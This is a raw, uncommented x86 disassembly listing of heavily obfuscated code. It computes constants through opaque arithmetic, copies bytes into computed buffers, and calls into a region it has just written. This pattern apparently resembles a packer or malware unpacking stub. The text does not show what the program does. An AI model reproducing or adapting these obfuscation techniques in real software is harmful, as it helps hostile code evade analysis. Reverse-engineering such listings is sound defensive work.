  41c138:	mov    edx,DWORD PTR [ebp-0x14]
  41c13b:	xor    edx,edx
  41c13d:	shl    ecx,0x1e
  41c140:	or     eax,edx
  41c142:	mov    ds:0x422370,eax
  41c147:	pop    esi
  41c148:	leave  
  41c149:	ret    
  41c14a:	push   ebp
  41c14b:	mov    ebp,esp
  41c14d:	sub    esp,0x28
  41c150:	push   ebx
  41c151:	push   esi
  41c152:	push   edi
  41c153:	mov    DWORD PTR [ebp-0x10],0x67e2
  41c15a:	mov    DWORD PTR [ebp-0x4],0x4726
  41c161:	mov    DWORD PTR [ebp-0x8],0x580
  41c168:	mov    DWORD PTR [ebp-0xc],0x5f3e
  41c16f:	mov    DWORD PTR [ebp-0x28],0x3294
  41c176:	mov    DWORD PTR [ebp-0x24],0x643
  41c17d:	mov    DWORD PTR [ebp-0x20],0x2545
  41c184:	mov    DWORD PTR [ebp-0x1c],0x43ab
  41c18b:	xor    ebx,ebx
  41c18d:	inc    ebx
  41c18e:	mov    DWORD PTR [ebp-0x18],ebx
  41c191:	mov    DWORD PTR [ebp-0x14],0x76b1
  41c198:	mov    ecx,DWORD PTR [ebp-0x8]
  41c19b:	mov    eax,DWORD PTR [ebp-0x4]
  41c19e:	sub    ecx,eax
  41c1a0:	add    ecx,DWORD PTR [ebp-0xc]
  41c1a3:	add    ecx,DWORD PTR [ebp-0x10]
  41c1a6:	imul   ecx,ecx,0x1f80
  41c1ac:	add    ecx,0x727e
  41c1b2:	xor    ecx,0x106c92f2
  41c1b8:	mov    DWORD PTR [ebp-0x8],0x113c
  41c1bf:	mov    DWORD PTR [ebp-0xc],0x3d61
  41c1c6:	mov    DWORD PTR [ebp-0x10],0x16e9
  41c1cd:	mov    DWORD PTR [ebp-0x4],0x21aa
  41c1d4:	mov    eax,DWORD PTR [ebp-0x10]
  41c1d7:	or     eax,0x3611
  41c1dc:	add    eax,DWORD PTR [ebp-0xc]
  41c1df:	mov    edx,DWORD PTR [ebp-0x8]
  41c1e2:	and    eax,edx
  41c1e4:	mov    edx,ecx
  41c1e6:	sub    edx,eax
  41c1e8:	mov    eax,DWORD PTR [ebp-0x4]
  41c1eb:	mov    esi,DWORD PTR ds:0x422268
  41c1f1:	mov    esi,DWORD PTR [esi+0x1cc]
  41c1f7:	add    eax,0x6772
  41c1fc:	or     eax,0x1f24
  41c201:	sub    eax,0x7046
  41c206:	xor    eax,0x497a
  41c20b:	sub    esi,eax
  41c20d:	mov    eax,DWORD PTR [ebp+0x8]
  41c210:	mov    al,BYTE PTR [edx+eax*1-0x5774]
  41c217:	mov    BYTE PTR [esi+ecx*1],al
  41c21a:	mov    eax,DWORD PTR [ebp-0x14]
  41c21d:	mov    esi,DWORD PTR [ebp-0x18]
  41c220:	and    eax,0x2389
  41c225:	xor    eax,0x695
  41c22a:	xor    edx,edx
  41c22c:	div    esi
  41c22e:	lea    ecx,[ecx+eax*1-0x2413]
  41c235:	mov    eax,DWORD PTR [ebp-0x1c]
  41c238:	add    eax,DWORD PTR [ebp-0x20]
  41c23b:	mov    edx,DWORD PTR [ebp-0x24]
  41c23e:	and    eax,edx
  41c240:	mov    edx,DWORD PTR [ebp-0x28]
  41c243:	imul   eax,edx
  41c246:	mov    edx,0xd0c8f
  41c24b:	sub    edx,eax
  41c24d:	cmp    ecx,edx
  41c24f:	jbe    0x41c1b8
  41c255:	push   0x2
  41c257:	pop    eax
  41c258:	mov    DWORD PTR [ebp-0x1c],eax
  41c25b:	mov    DWORD PTR [ebp-0x20],ebx
  41c25e:	mov    DWORD PTR [ebp-0x24],0x5
  41c265:	mov    DWORD PTR [ebp-0x28],0x6686
  41c26c:	mov    DWORD PTR [ebp-0x8],0x7cf1
  41c273:	mov    DWORD PTR [ebp-0x4],eax
  41c276:	mov    DWORD PTR [ebp+0x8],0x739a
  41c27d:	mov    DWORD PTR [ebp-0xc],0xf3a
  41c284:	xor    edx,edx
  41c286:	mov    DWORD PTR [ebp-0x10],0x429
  41c28d:	mov    eax,DWORD PTR [ebp-0x28]
  41c290:	mov    ecx,DWORD PTR [ebp-0x24]
  41c293:	sub    eax,0x175c
  41c298:	div    ecx
  41c29a:	mov    ecx,DWORD PTR [ebp-0x20]
  41c29d:	xor    edx,edx
  41c29f:	mov    edi,0x4db5
  41c2a4:	div    ecx
  41c2a6:	mov    ecx,DWORD PTR [ebp-0x1c]
  41c2a9:	xor    edx,edx
  41c2ab:	div    ecx
  41c2ad:	xor    edx,edx
  41c2af:	mov    ecx,eax
  41c2b1:	mov    eax,DWORD PTR [ebp+0x8]
  41c2b4:	imul   ecx,ecx,0x2e01
  41c2ba:	mov    esi,DWORD PTR [ebp-0x4]
  41c2bd:	add    eax,edi
  41c2bf:	div    esi
  41c2c1:	mov    edx,DWORD PTR [ebp-0x8]
  41c2c4:	mov    esi,0x940a7
  41c2c9:	sub    ecx,0x16bea86
  41c2cf:	sub    eax,edx
  41c2d1:	xor    edx,edx
  41c2d3:	div    esi
  41c2d5:	mov    esi,0xdbd
  41c2da:	add    eax,esi
  41c2dc:	cmp    ecx,eax
  41c2de:	jae    0x41c39f
  41c2e4:	mov    DWORD PTR [ebp-0x1c],0x2d7e
  41c2eb:	mov    DWORD PTR [ebp-0x20],0x383e
  41c2f2:	mov    DWORD PTR [ebp-0x24],0x3a3a
  41c2f9:	mov    DWORD PTR [ebp-0x14],0x13cd
  41c300:	xor    edx,edx
  41c302:	mov    DWORD PTR [ebp-0x18],0x187
  41c309:	mov    DWORD PTR [ebp-0x28],0x3224
  41c310:	mov    eax,DWORD PTR [ebp-0x28]
  41c313:	push   0x6
  41c315:	pop    ebx
  41c316:	div    ebx
  41c318:	mov    edx,eax
  41c31a:	mov    eax,ds:0x422268
  41c31f:	mov    eax,DWORD PTR [eax+0x1d0]
  41c325:	sub    eax,edx
  41c327:	mov    edx,DWORD PTR [ebp-0x24]
  41c32a:	mov    ebx,DWORD PTR [ebp-0x20]
  41c32d:	imul   edx,ebx
  41c330:	mov    ebx,DWORD PTR [ebp-0x1c]
  41c333:	xor    edx,ebx
  41c335:	sub    edx,0x26bd
  41c33b:	add    eax,ecx
  41c33d:	and    edx,0x7126
  41c343:	mov    ebx,ecx
  41c345:	sub    ebx,edx
  41c347:	mov    edx,DWORD PTR [ebp-0x18]
  41c34a:	sub    eax,edx
  41c34c:	mov    edx,DWORD PTR [ebp-0x14]
  41c34f:	sub    eax,edx
  41c351:	mov    edx,DWORD PTR [ebp+0xc]
  41c354:	mov    dl,BYTE PTR [ebx+edx*1+0x16c0]
  41c35b:	mov    BYTE PTR [eax-0xbb5],dl
  41c361:	mov    eax,DWORD PTR [ebp-0x10]
  41c364:	xor    eax,0xffffe1ce
  41c369:	add    eax,DWORD PTR [ebp-0xc]
  41c36c:	xor    edx,edx
  41c36e:	and    eax,0x6d33
  41c373:	lea    ecx,[ecx+eax*1-0x6520]
  41c37a:	mov    eax,DWORD PTR [ebp+0x8]
  41c37d:	mov    ebx,DWORD PTR [ebp-0x4]
  41c380:	add    eax,edi
  41c382:	div    ebx
  41c384:	mov    edx,DWORD PTR [ebp-0x8]
  41c387:	mov    ebx,0x940a7
  41c38c:	sub    eax,edx
  41c38e:	xor    edx,edx
  41c390:	div    ebx
  41c392:	add    eax,esi
  41c394:	cmp    ecx,eax
  41c396:	jb     0x41c2e4
  41c39c:	xor    ebx,ebx
  41c39e:	inc    ebx
  41c39f:	mov    DWORD PTR [ebp+0xc],0x77bd
  41c3a6:	mov    DWORD PTR [ebp+0x8],0x4f2a
  41c3ad:	mov    DWORD PTR [ebp-0x8],0x4738
  41c3b4:	mov    DWORD PTR [ebp-0xc],0x6c4e
  41c3bb:	mov    DWORD PTR [ebp-0x10],0x7f0d
  41c3c2:	mov    DWORD PTR [ebp-0x14],0x64ec
  41c3c9:	mov    DWORD PTR [ebp-0x18],0x1984
  41c3d0:	mov    DWORD PTR [ebp-0x1c],0x293
  41c3d7:	mov    eax,DWORD PTR [ebp+0x8]
  41c3da:	mov    ecx,DWORD PTR [ebp+0xc]
  41c3dd:	add    eax,0x1ef2
  41c3e2:	and    eax,ecx
  41c3e4:	xor    eax,0x7240
  41c3e9:	mov    ecx,0x7aaa
  41c3ee:	sub    ecx,eax
  41c3f0:	mov    DWORD PTR [ebp+0xc],0x8d3
  41c3f7:	mov    DWORD PTR [ebp+0x8],0x2392
  41c3fe:	mov    DWORD PTR [ebp-0x20],ebx
  41c401:	mov    DWORD PTR [ebp-0x24],0x338f
  41c408:	mov    DWORD PTR [ebp-0x28],0x61c9
  41c40f:	mov    eax,DWORD PTR [ebp+0x8]
  41c412:	mov    edx,DWORD PTR [ebp+0xc]
  41c415:	imul   eax,edx
  41c418:	xor    eax,0x40a0
  41c41d:	or     eax,0x1a48
  41c422:	xor    eax,0x139ddb0
  41c427:	mov    esi,ecx
  41c429:	sub    esi,eax
  41c42b:	mov    eax,DWORD PTR [ebp-0x28]
  41c42e:	mov    edx,DWORD PTR [ebp-0x24]
  41c431:	mov    edi,DWORD PTR [ebp-0x20]
  41c434:	or     eax,0x1cc2
  41c439:	sub    eax,edx
  41c43b:	xor    edx,edx
  41c43d:	div    edi
  41c43f:	mov    edx,DWORD PTR ds:0x422268
  41c445:	mov    edx,DWORD PTR [edx+0x1d4]
  41c44b:	sub    edx,eax
  41c44d:	mov    eax,DWORD PTR [ebp+0x10]
  41c450:	mov    al,BYTE PTR [esi+eax*1]
  41c453:	mov    BYTE PTR [edx+ecx*1-0x1c12],al
  41c45a:	mov    eax,DWORD PTR [ebp-0x1c]
  41c45d:	mov    edx,DWORD PTR [ebp-0x18]
  41c460:	imul   eax,edx
  41c463:	mov    edx,DWORD PTR [ebp-0x14]
  41c466:	imul   eax,eax,0x262b
  41c46c:	or     eax,edx
  41c46e:	mov    edx,DWORD PTR [ebp-0x10]
  41c471:	or     eax,edx
  41c473:	xor    eax,0x59f6
  41c478:	lea    ecx,[ecx+eax*1+0x350559e6]
  41c47f:	mov    eax,DWORD PTR [ebp-0xc]
  41c482:	and    eax,0xddc
  41c487:	add    eax,DWORD PTR [ebp-0x8]
  41c48a:	xor    eax,0x46e3
  41c48f:	add    eax,0x50eb
  41c494:	cmp    ecx,eax
  41c496:	jne    0x41c3f0
  41c49c:	pop    edi
  41c49d:	pop    esi
  41c49e:	pop    ebx
  41c49f:	leave  
  41c4a0:	ret    0xc
  41c4a3:	push   ebp
  41c4a4:	mov    ebp,esp
  41c4a6:	sub    esp,0xec
  41c4ac:	push   ebx
  41c4ad:	push   esi
  41c4ae:	mov    DWORD PTR [ebp-0x8],0x548e
  41c4b5:	mov    DWORD PTR [ebp-0x4],0x61c2
  41c4bc:	mov    eax,DWORD PTR [ebp-0x4]
  41c4bf:	mov    ecx,DWORD PTR [ebp-0x8]
  41c4c2:	add    eax,0x1ca5
  41c4c7:	or     eax,ecx
  41c4c9:	mov    ecx,DWORD PTR ds:0x422268
  41c4cf:	lea    eax,[eax+ecx*1-0x7eef]
  41c4d6:	mov    DWORD PTR [ebp-0x5c],eax
  41c4d9:	mov    DWORD PTR [ebp-0x4],0x8ea
  41c4e0:	mov    DWORD PTR [ebp-0x8],0x5759
  41c4e7:	mov    eax,DWORD PTR [ebp-0x8]
  41c4ea:	mov    ecx,DWORD PTR [ebp-0x4]
  41c4ed:	and    eax,0x27f6
  41c4f2:	xor    eax,ecx
  41c4f4:	mov    ecx,DWORD PTR ds:0x42239c
  41c4fa:	imul   eax,eax,0x18
  41c4fd:	xor    eax,0x17970
  41c502:	lea    eax,[ebp+eax*1-0x54]
  41c506:	mov    DWORD PTR [eax],ecx
  41c508:	mov    DWORD PTR [ebp-0x4],0x7584
  41c50f:	mov    DWORD PTR [ebp-0x8],0x7c9f
  41c516:	mov    eax,DWORD PTR [ebp-0x8]
  41c519:	xor    edx,edx
  41c51b:	push   0x3
  41c51d:	pop    ecx
  41c51e:	div    ecx
  41c520:	mov    ecx,DWORD PTR [ebp-0x4]
  41c523:	xor    edx,edx
  41c525:	push   0x2
  41c527:	add    eax,0x14d3
  41c52c:	and    eax,ecx
  41c52e:	mov    ecx,0x6404
  41c533:	sub    ecx,eax
  41c535:	mov    DWORD PTR [ebp-0x74],ecx
  41c538:	mov    DWORD PTR [ebp-0xc],0x13b5
  41c53f:	mov    DWORD PTR [ebp-0x8],0x2e54
  41c546:	mov    DWORD PTR [ebp-0x4],0x2f11
  41c54d:	mov    eax,DWORD PTR [ebp-0x8]
  41c550:	mov    ecx,DWORD PTR [ebp-0x4]
  41c553:	lea    eax,[ecx+eax*1-0x65ec]
  41c55a:	mov    ecx,0x5e208
  41c55f:	div    ecx
  41c561:	mov    ecx,DWORD PTR [ebp-0xc]
  41c564:	lea    eax,[eax+ecx*1+0x40c7]
  41c56b:	mov    DWORD PTR [ebp-0x24],eax
  41c56e:	mov    DWORD PTR [ebp-0x4],0x1bc6
  41c575:	mov    DWORD PTR [ebp-0x8],0x16ac
  41c57c:	mov    DWORD PTR [ebp-0xc],0x2185
  41c583:	mov    eax,DWORD PTR [ebp-0xc]
  41c586:	mov    ecx,DWORD PTR [ebp-0x8]
  41c589:	xor    eax,0x1f75
  41c58e:	sub    eax,ecx
  41c590:	mov    ecx,DWORD PTR [ebp-0x4]
  41c593:	sub    eax,ecx
  41c595:	xor    eax,0xc3e
  41c59a:	mov    DWORD PTR [ebp-0x58],eax
  41c59d:	mov    DWORD PTR [ebp-0x14],0x66bd
  41c5a4:	pop    ecx
  41c5a5:	mov    DWORD PTR [ebp-0x4],ecx
  41c5a8:	mov    DWORD PTR [ebp-0x8],0x3374
  41c5af:	mov    DWORD PTR [ebp-0xc],0x3c31
  41c5b6:	mov    eax,DWORD PTR [ebp-0xc]
  41c5b9:	mov    edx,DWORD PTR [ebp-0x8]
  41c5bc:	mov    esi,DWORD PTR [ebp-0x4]
  41c5bf:	xor    eax,edx
  41c5c1:	xor    edx,edx
  41c5c3:	div    esi
  41c5c5:	mov    edx,DWORD PTR [ebp-0x14]
  41c5c8:	and    eax,edx
  41c5ca:	sub    eax,0x680
  41c5cf:	mov    DWORD PTR [ebp-0x24],eax
  41c5d2:	mov    DWORD PTR [ebp-0x30],0x5f68
  41c5d9:	mov    DWORD PTR [ebp-0x2c],0x398b
  41c5e0:	mov    DWORD PTR [ebp-0x4],0x5034
  41c5e7:	mov    DWORD PTR [ebp-0x8],0x7cbf
  41c5ee:	mov    DWORD PTR [ebp-0xc],0x4f6c
  41c5f5:	mov    DWORD PTR [ebp-0x14],0xee2
  41c5fc:	mov    eax,DWORD PTR [ebp-0x14]
  41c5ff:	add    eax,DWORD PTR [ebp-0xc]
  41c602:	mov    edx,DWORD PTR [ebp-0x8]
  41c605:	xor    eax,edx
  41c607:	mov    edx,DWORD PTR [ebp-0x4]
  41c60a:	or     eax,edx
  41c60c:	mov    edx,DWORD PTR [ebp-0x2c]
  41c60f:	or     eax,edx
  41c611:	mov    edx,DWORD PTR [ebp-0x30]
  41c614:	and    eax,edx
  41c616:	mov    edx,0x5b68
  41c61b:	sub    edx,eax
  41c61d:	mov    DWORD PTR [ebp-0x24],edx
  41c620:	mov    DWORD PTR [ebp-0x48],0x3308
  41c627:	mov    DWORD PTR [ebp-0x44],0x59a4
  41c62e:	mov    DWORD PTR [ebp-0x38],0x2775
  41c635:	mov    DWORD PTR [ebp-0x34],0x4da
  41c63c:	mov    DWORD PTR [ebp-0x40],0x49d8
  41c643:	mov    DWORD PTR [ebp-0x3c],0x1b5c
  41c64a:	mov    DWORD PTR [ebp-0x28],0x338c
  41c651:	mov    DWORD PTR [ebp-0x24],0x68ed
  41c658:	mov    DWORD PTR [ebp-0x20],0x2a7b
  41c65f:	mov    DWORD PTR [ebp-0x1c],0x718f
  41c666:	mov    eax,DWORD PTR [ebp-0x20]
  41c669:	mov    edx,DWORD PTR [ebp-0x1c]
  41c66c:	mov    esi,DWORD PTR [ebp-0x28]
  41c66f:	mov    ebx,DWORD PTR [ebp-0x24]
  41c672:	add    eax,0xffffc948
  41c677:	adc    edx,0xffff87b0
  41c67d:	or     eax,esi
  41c67f:	mov    esi,DWORD PTR [ebp-0x40]
  41c682:	or     eax,esi
  41c684:	or     edx,ebx
  41c686:	mov    ebx,DWORD PTR [ebp-0x3c]
  41c689:	mov    esi,DWORD PTR [ebp-0x38]
  41c68c:	or     edx,ebx
  41c68e:	mov    ebx,DWORD PTR [ebp-0x34]
  41c691:	sub    eax,esi
  41c693:	mov    esi,DWORD PTR [ebp-0x48]
  41c696:	sbb    edx,ebx
  41c698:	mov    ebx,DWORD PTR [ebp-0x44]
  41c69b:	or     eax,esi
  41c69d:	or     edx,ebx
  41c69f:	add    eax,0x89b
  41c6a4:	mov    DWORD PTR [ebp-0x20],eax
  41c6a7:	adc    edx,0x5a
  41c6aa:	mov    DWORD PTR [ebp-0x1c],edx
  41c6ad:	mov    DWORD PTR [ebp-0x80],0xfa4
  41c6b4:	mov    DWORD PTR [ebp-0x70],0x618e
  41c6bb:	mov    DWORD PTR [ebp-0x6c],0x811
  41c6c2:	mov    DWORD PTR [ebp-0x98],0x42d6904a
  41c6cc:	mov    DWORD PTR [ebp-0x94],0xe82c1
  41c6d6:	mov    DWORD PTR [ebp-0x88],0x58ff
  41c6e0:	mov    DWORD PTR [ebp-0x84],0x7394
  41c6ea:	xor    eax,eax
  41c6ec:	inc    eax
  41c6ed:	mov    DWORD PTR [ebp-0x64],eax
  41c6f0:	mov    DWORD PTR [ebp-0x8],0x5f59
  41c6f7:	mov    DWORD PTR [ebp-0x4],0x652b
  41c6fe:	mov    DWORD PTR [ebp-0xc],0xf43
  41c705:	mov    DWORD PTR [ebp-0x14],0x22dc
  41c70c:	mov    DWORD PTR [ebp-0x2c],0x45d4
  41c713:	mov    DWORD PTR [ebp-0x30],0x28e1
  41c71a:	mov    DWORD PTR [ebp-0x7c],0x5e09
  41c721:	mov    DWORD PTR [ebp-0x50],0x3910
  41c728:	mov    DWORD PTR [ebp-0x3c],0x5c97
  41c72f:	mov    DWORD PTR [ebp-0x24],0x6111
  41c736:	mov    DWORD PTR [ebp-0x78],ecx
  41c739:	mov    DWORD PTR [ebp-0x34],ecx
  41c73c:	mov    DWORD PTR [ebp-0x44],0x207a
  41c743:	mov    DWORD PTR [ebp-0x60],eax
  41c746:	mov    DWORD PTR [ebp-0x8c],0x7840
  41c750:	mov    DWORD PTR [ebp-0x4c],0x6b0b
  41c757:	mov    eax,DWORD PTR [ebp-0x30]
  41c75a:	or     eax,0x70c5
  41c75f:	add    eax,DWORD PTR [ebp-0x2c]
  41c762:	mov    ecx,DWORD PTR [ebp-0x14]
  41c765:	or     eax,ecx
  41c767:	mov    ecx,0xce40
  41c76c:	sub    ecx,eax
  41c76e:	mov    eax,DWORD PTR [ebp-0xc]
  41c771:	sub    ecx,eax
  41c773:	imul   ecx,ecx,0x7480
  41c779:	add    ecx,DWORD PTR [ebp-0x58]
  41c77c:	mov    eax,DWORD PTR [ebp-0x8]
  41c77f:	push   ecx
  41c780:	mov    ecx,DWORD PTR [ebp-0x4]
  41c783:	lea    eax,[ecx+eax*1-0x1e6d]
  41c78a:	mov    ecx,DWORD PTR [ebp-0x64]
  41c78d:	xor    edx,edx
  41c78f:	div    ecx
  41c791:	mov    ecx,DWORD PTR [ebp-0x74]
  41c794:	lea    eax,[eax+ecx*1-0xa617]
  41c79b:	push   eax
  41c79c:	mov    eax,DWORD PTR [ebp-0x88]
  41c7a2:	mov    ecx,DWORD PTR [ebp-0x84]
  41c7a8:	push   0x770a
  41c7ad:	push   0x2a0c
  41c7b2:	push   ecx
  41c7b3:	push   eax
  41c7b4:	call   0x41df90
  41c7b9:	mov    ecx,DWORD PTR [ebp-0x98]
  41c7bf:	mov    esi,DWORD PTR [ebp-0x94]
  41c7c5:	push   esi
  41c7c6:	push   ecx
  41c7c7:	or     edx,0x615d
  41c7cd:	or     eax,0x455c
  41c7d2:	push   edx
  41c7d3:	push   eax
  41c7d4:	call   0x421ad5
  41c7d9:	mov    ecx,DWORD PTR [ebp-0x70]
  41c7dc:	mov    edx,DWORD PTR [ebp-0x6c]
  41c7df:	xor    eax,ecx
  41c7e1:	mov    ecx,DWORD PTR [ebp-0x20]
  41c7e4:	mov    edx,DWORD PTR [ebp-0x1c]
  41c7e7:	mov    esi,DWORD PTR [ebp-0x80]
  41c7ea:	and    eax,0xb49
  41c7ef:	add    esi,0x629b
  41c7f5:	lea    eax,[eax+ecx*1-0xfd]
  41c7fc:	xor    esi,0x4994
  41c802:	push   eax
  41c803:	lea    esi,[ebp+esi*1-0x3c93]
  41c80a:	call   0x41c9b6
  41c80f:	mov    ecx,eax
  41c811:	mov    eax,DWORD PTR [ebp-0x50]
  41c814:	mov    edx,DWORD PTR [ebp-0x7c]
  41c817:	sub    eax,0x161
  41c81c:	xor    eax,edx
  41c81e:	imul   eax,eax,0x5151
  41c824:	add    eax,0x3901
  41c829:	xor    eax,0x40c2
  41c82e:	xor    edx,edx
  41c830:	mov    esi,0x218f6c45
  41c835:	div    esi
  41c837:	cmp    ecx,eax
  41c839:	jne    0x41c9a6
  41c83f:	mov    ecx,DWORD PTR [ebp-0x78]
  41c842:	xor    edx,edx
  41c844:	mov    eax,0x209c
  41c849:	div    ecx
  41c84b:	mov    ecx,DWORD PTR ds:0x422268
  41c851:	mov    ecx,DWORD PTR [ecx+0x1a8]
  41c857:	xor    edx,edx
  41c859:	sub    ecx,eax
  41c85b:	mov    eax,DWORD PTR [ebp-0x4c]
  41c85e:	xor    eax,0x3daa
  41c863:	sub    eax,0x3375
  41c868:	or     eax,0x6931
  41c86d:	lea    eax,[ebp+eax*1-0x6c25]
  41c874:	push   eax
  41c875:	mov    eax,DWORD PTR [ebp-0x8c]
  41c87b:	push   0x18
  41c87d:	pop    esi
  41c87e:	div    esi
  41c880:	mov    esi,DWORD PTR [ebp-0x60]
  41c883:	xor    edx,edx
  41c885:	div    esi
  41c887:	mov    edx,DWORD PTR [ebp-0x44]
  41c88a:	mov    esi,DWORD PTR [ebp-0x34]
  41c88d:	xor    eax,edx
  41c88f:	xor    edx,edx
  41c891:	div    esi
  41c893:	imul   eax,eax,0x7d2a
  41c899:	sub    eax,0x928ded7
  41c89e:	push   eax
  41c89f:	mov    eax,ds:0x422268
  41c8a4:	add    eax,0xaa
  41c8a9:	push   eax
  41c8aa:	mov    eax,DWORD PTR [ebp-0x3c]
  41c8ad:	sub    ecx,eax
  41c8af:	mov    eax,DWORD PTR [ebp-0x24]
  41c8b2:	push   DWORD PTR [ecx+eax*1+0xbd4]
  41c8b9:	call   0x41f816
  41c8be:	mov    DWORD PTR [ebp-0x4],eax
  41c8c1:	mov    ecx,DWORD PTR ds:0x422370
  41c8c7:	lea    eax,[ebp+0x4]
  41c8ca:	mov    DWORD PTR [ecx*4+0x422368],eax
  41c8d1:	inc    DWORD PTR ds:0x422370
  41c8d7:	mov    eax,DWORD PTR [ebp-0x4]
  41c8da:	mov    eax,DWORD PTR [ebp-0x4]
  41c8dd:	xor    edx,edx
  41c8df:	shld   edx,eax,0x2
  41c8e3:	shl    eax,0x2
  41c8e6:	mov    ecx,0xba699573
  41c8eb:	mov    esi,0x9c0a89d8
  41c8f0:	xor    eax,ecx
  41c8f2:	xor    edx,esi
  41c8f4:	cmp    eax,ecx
  41c8f6:	jne    0x41c910
  41c8fc:	cmp    edx,esi
  41c8fe:	jne    0x41c910
  41c904:	mov    eax,0xba699577
  41c909:	mov    edx,esi
  41c90b:	jmp    0x41c9b0
  41c910:	lea    eax,[ebp-0x10]
  41c913:	mov    DWORD PTR [ebp-0x9c],eax
  41c919:	mov    eax,DWORD PTR [ebp-0x54]
  41c91c:	mov    DWORD PTR [ebp-0x10],eax
  41c91f:	mov    eax,DWORD PTR [ebp-0x10]
  41c922:	mov    ecx,DWORD PTR [ebp-0x4]
  41c925:	sub    eax,ecx
  41c927:	mov    DWORD PTR [ebp-0x10],eax
  41c92a:	mov    eax,DWORD PTR [ebp-0x20]
  41c92d:	mov    ecx,DWORD PTR [ebp-0x1c]
  41c930:	sub    DWORD PTR [ebp-0x10],eax
  41c933:	mov    eax,DWORD PTR [ebp-0x4]
  41c936:	mov    DWORD PTR [eax],0x658776e9
  41c93c:	mov    DWORD PTR [eax+0x4],0xab756547
  41c943:	mov    eax,DWORD PTR [ebp-0x10]
  41c946:	mov    ecx,DWORD PTR [ebp-0x4]
  41c949:	mov    DWORD PTR [ecx+0x1],eax
  41c94c:	mov    eax,ds:0x4220e4
  41c951:	push   DWORD PTR [eax]
  41c953:	push   DWORD PTR ds:0x422358
  41c959:	push   DWORD PTR ds:0x4220ec
  41c95f:	push   DWORD PTR ds:0x422338
  41c965:	push   DWORD PTR ds:0x4223ac
  41c96b:	push   0xa3e69a99
  41c970:	push   0xa3e69a9d
  41c975:	push   DWORD PTR [ebp-0x5c]
  41c978:	mov    eax,DWORD PTR [ebp-0x4]
  41c97b:	call   eax
  41c97d:	mov    eax,DWORD PTR [edi]
  41c97f:	mov    eax,DWORD PTR [ebp+0x8]
  41c982:	push   DWORD PTR [eax]
  41c984:	call   0x41cba6
  41c989:	mov    eax,ds:0x422268
  41c98e:	push   0x4
  41c990:	add    eax,0x1dc
  41c995:	push   eax
  41c996:	push   edi
  41c997:	call   0x41d2e9
  41c99c:	mov    eax,0xba69957b
  41c9a1:	jmp    0x41c909
  41c9a6:	mov    eax,0xba699573
  41c9ab:	mov    edx,0x9c0a89d8
  41c9b0:	pop    esi
  41c9b1:	pop    ebx
  41c9b2:	leave  
  41c9b3:	ret    0x4
  41c9b6:	push   ebp
  41c9b7:	mov    ebp,esp
  41c9b9:	sub    esp,0x20
  41c9bc:	push   ebx
  41c9bd:	push   edi
  41c9be:	mov    DWORD PTR [ebp-0x8],0x522e
  41c9c5:	mov    DWORD PTR [ebp-0x4],0x3dbd
  41c9cc:	mov    DWORD PTR [ebp-0x10],0x53f1
  41c9d3:	mov    DWORD PTR [ebp-0xc],0x631b
  41c9da:	mov    DWORD PTR [ebp-0x18],0x524d
  41c9e1:	mov    DWORD PTR [ebp-0x14],0x1600
  41c9e8:	mov    eax,DWORD PTR [ebp-0x18]
  41c9eb:	mov    ecx,DWORD PTR [ebp-0x14]
  41c9ee:	mov    edx,DWORD PTR [ebp-0x10]
  41c9f1:	mov    edi,DWORD PTR [ebp-0xc]
  41c9f4:	push   edi
  41c9f5:	push   edx
  41c9f6:	push   ecx
  41c9f7:	push   eax
  41c9f8:	call   0x41df90
  41c9fd:	mov    ecx,DWORD PTR [ebp-0x8]
  41ca00:	mov    edi,DWORD PTR [ebp-0x4]
  41ca03:	add    eax,0x1dc8
  41ca08:	adc    edx,0x6fbf
  41ca0e:	and    edx,edi
  41ca10:	push   0x1061
  41ca15:	and    eax,ecx
  41ca17:	or     edx,0x23ff
  41ca1d:	push   0x4000022f
  41ca22:	or     eax,0x58c4
  41ca27:	xor    edx,0x7a7a
  41ca2d:	xor    eax,0x5278
  41ca32:	push   edx
  41ca33:	push   eax
  41ca34:	call   0x421ad5
  41ca39:	mov    DWORD PTR [esi],eax
  41ca3b:	mov    DWORD PTR [ebp-0x20],0x3354
  41ca42:	mov    DWORD PTR [ebp-0x1c],0x7d8c
  41ca49:	mov    DWORD PTR [ebp-0x18],0x3d36
  41ca50:	mov    DWORD PTR [ebp-0x14],0x51ef
  41ca57:	xor    edi,edi
  41ca59:	mov    DWORD PTR [ebp-0xc],0x3358
  41ca60:	push   0xc9f
  41ca65:	inc    edi
  41ca66:	mov    DWORD PTR [ebp-0x4],edi
  41ca69:	mov    eax,DWORD PTR [ebp-0x18]
  41ca6c:	mov    ecx,DWORD PTR [ebp-0x14]
  41ca6f:	push   0x1c19
  41ca74:	push   ecx
  41ca75:	push   eax
  41ca76:	call   0x41df90
  41ca7b:	mov    ecx,DWORD PTR [ebp-0x20]
  41ca7e:	mov    ebx,DWORD PTR [ebp-0x1c]
  41ca81:	or     eax,ecx
  41ca83:	or     edx,ebx
  41ca85:	push   0x20fa
  41ca8a:	add    eax,0x7fac
  41ca8f:	push   0x1cd48ab
  41ca94:	adc    edx,0x133b
  41ca9a:	push   edx
  41ca9b:	push   eax
  41ca9c:	call   0x421ad5
  41caa1:	mov    ebx,DWORD PTR [ebp-0x4]
  41caa4:	lea    ecx,[eax-0x5d40]
  41caaa:	xor    edx,edx
  41caac:	mov    eax,0x16c2
  41cab1:	div    ebx
  41cab3:	mov    edx,DWORD PTR [ebp-0xc]
  41cab6:	sub    eax,edx
  41cab8:	mov    DWORD PTR [esi+eax*4+0x725c],ecx
  41cabf:	mov    DWORD PTR [ebp-0x14],0x6af0
  41cac6:	mov    DWORD PTR [ebp-0x4],edi
  41cac9:	mov    DWORD PTR [ebp-0xc],0x2c8a
  41cad0:	mov    ecx,DWORD PTR [ebp-0xc]
  41cad3:	mov    eax,0x4401
  41cad8:	sub    eax,ecx
  41cada:	mov    ecx,DWORD PTR [ebp-0x4]
  41cadd:	xor    edx,edx
  41cadf:	div    ecx
  41cae1:	mov    ecx,DWORD PTR [ebp-0x14]
  41cae4:	xor    eax,0xa80
  41cae9:	or     eax,0x343b
  41caee:	or     eax,ecx
  41caf0:	mov    ecx,DWORD PTR [ebp+0x8]
  41caf3:	mov    DWORD PTR [esi+eax*4-0x1fff4],ecx
  41cafa:	mov    DWORD PTR [ebp-0xc],0x327f
  41cb01:	mov    DWORD PTR [ebp-0x14],0x5215
  41cb08:	mov    DWORD PTR [ebp+0x8],0x2502
  41cb0f:	mov    eax,DWORD PTR [ebp+0x8]
  41cb12:	add    eax,DWORD PTR [ebp-0x14]
  41cb15:	mov    ecx,DWORD PTR [ebp-0xc]
  41cb18:	and    eax,0x2bab
  41cb1d:	lea    eax,[eax+ecx*1-0x557f]
